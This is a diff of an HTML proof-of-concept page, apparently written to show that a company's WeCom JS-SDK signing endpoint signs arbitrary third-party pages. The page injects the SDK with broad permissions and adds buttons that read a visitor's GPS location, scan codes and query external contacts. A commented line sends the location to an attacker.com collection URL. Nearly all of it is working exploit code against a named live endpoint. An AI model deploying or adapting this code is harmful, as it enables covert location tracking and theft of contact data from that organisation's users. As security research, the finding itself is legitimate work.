@@ -4,29 +4,119 @@
 <script src="https://res.wx.qq.com/open/js/jweixin-1.6.0.js"></script>
 </head>
 <body>
-<pre id="out">Loading...</pre>
+<h2 id="status">Loading...</h2>
+<pre id="out"></pre>
+<button onclick="testLocation()">📍 获取位置</button>
+<button onclick="testScan()">📷 扫码</button>
+<button onclick="testUserInfo()">👤 获取用户信息</button>
+<br><br>
 <script>
+
+// 第一步：获取签名
 fetch('https://srop-wecom.sheincorp.cn/open/wechat/getJsSdkConfig',{
   method:'POST',
   headers:{'Content-Type':'application/json'},
   body:JSON.stringify({uri:location.href})
-}).then(r=>{
-  console.log('CORS Allow-Origin:',r.headers.get('access-control-allow-origin'))
-  return r.json()
-}).then(data=>{
-  document.getElementById('out').textContent='签名响应:\n'+JSON.stringify(data,null,2)
-  if(data.code!=='0'){return}
-  const c=data.info
-  wx.config({beta:true,debug:true,appId:c.cropId,agentId:c.agentId,
-    timestamp:c.timestamp,nonceStr:c.nonceStr,signature:c.signature,
-    jsApiList:['getLocation','checkJsApi','scanQRCode']})
-  wx.ready(()=>{
-    document.getElementById('out').textContent+= '\n\n✅ wx.ready() 成功！\nJSSDK已注入第三方域名\nAgentID:'+c.agentId
-    wx.checkJsApi({jsApiList:['getLocation','scanQRCode'],
-      success:r=>document.getElementById('out').textContent+='\n\ncheckJsApi:\n'+JSON.stringify(r,null,2)})
+}).then(r=>r.json()).then(data=>{
+  log('签名获取: code='+data.code)
+  if(data.code!=='0') return
+
+  const c = data.info
+  log('AgentID: '+c.agentId)
+  log('CorpID: '+c.cropId)
+
+  wx.config({
+    beta: true,
+    debug: false,
+    appId: c.cropId,
+    agentId: c.agentId,
+    timestamp: c.timestamp,
+    nonceStr: c.nonceStr,
+    signature: c.signature,
+    jsApiList: [
+      'checkJsApi',
+      'getLocation',
+      'scanQRCode',
+      'chooseImage',
+      'getNetworkType',
+      'openEnterpriseChat',
+      'getCurExternalContact',
+      'sendChatMessage',
+      'agentConfig'
+    ]
   })
-  wx.error(e=>document.getElementById('out').textContent+='\n\n❌ wx.error:\n'+JSON.stringify(e,null,2))
-}).catch(e=>document.getElementById('out').textContent='❌ CORS blocked: '+e.message)
+
+  wx.ready(()=>{
+    document.getElementById('status').textContent = '✅ wx.ready() 成功 — JSSDK 注入第三方域名有效'
+
+    // 检查哪些 API 可用
+    wx.checkJsApi({
+      jsApiList:[
+        'getLocation',
+        'scanQRCode',
+        'chooseImage',
+        'openEnterpriseChat',
+        'getCurExternalContact',
+        'sendChatMessage'
+      ],
+      success: res => {
+        log('\ncheckJsApi 结果:')
+        Object.entries(res.checkResult).forEach(([api, ok])=>{
+          log((ok?'✅':'❌') + ' ' + api)
+        })
+      }
+    })
+  })
+
+  wx.error(e=>{
+    document.getElementById('status').textContent = '❌ wx.error'
+    log('wx.error: '+JSON.stringify(e))
+  })
+
+}).catch(e=>{
+  document.getElementById('status').textContent = '❌ CORS blocked'
+  log(e.message)
+})
+
+// 按钮函数
+function testLocation(){
+  wx.getLocation({
+    type:'gcj02',
+    success: res=>{
+      log('\n📍 用户GPS位置:')
+      log('纬度: '+res.latitude)
+      log('经度: '+res.longitude)
+      log('精度: '+res.accuracy+'m')
+      // 实际攻击中发送到收集服务器
+      // fetch('https://attacker.com/collect?loc='+JSON.stringify(res))
+    },
+    fail: e=>log('getLocation fail: '+JSON.stringify(e))
+  })
+}
+
+function testScan(){
+  wx.scanQRCode({
+    needResult: 1,
+    scanType: ['qrCode','barCode'],
+    success: res=>{
+      log('\n📷 扫码结果:')
+      log(res.resultStr)
+    },
+    fail: e=>log('scanQRCode fail: '+JSON.stringify(e))
+  })
+}
+
+function testUserInfo(){
+  // 需要 agentConfig 二次注入才能获取用户信息
+  wx.invoke('getCurExternalContact',{}, res=>{
+    log('\n👤 外部联系人:')
+    log(JSON.stringify(res))
+  })
+}
+
+function log(msg){
+  document.getElementById('out').textContent += '\n' + msg
+}
 </script>
 </body>
 </html>
